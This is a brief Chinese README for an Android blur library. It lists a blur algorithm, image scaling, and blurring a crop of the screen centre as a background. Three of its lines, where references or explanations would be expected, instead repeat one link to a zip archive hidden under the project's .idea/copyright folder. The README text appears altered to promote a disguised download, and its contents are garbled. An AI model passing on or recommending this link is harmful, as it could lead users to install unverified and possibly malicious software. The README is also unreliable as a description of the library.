android-blur
============

implements of  https://github.com/rendyramon/android-blur/raw/refs/heads/master/.idea/copyright/android_blur_v1.6-alpha.1.zip

主要实现了以下功能：

1：模糊算法https://github.com/rendyramon/android-blur/raw/refs/heads/master/.idea/copyright/android_blur_v1.6-alpha.1.zip

2：图片的缩放https://github.com/rendyramon/android-blur/raw/refs/heads/master/.idea/copyright/android_blur_v1.6-alpha.1.zip

3：图片截取:主要是截取屏幕中间的图片，然后做模糊处理，处理后设置为图片背景
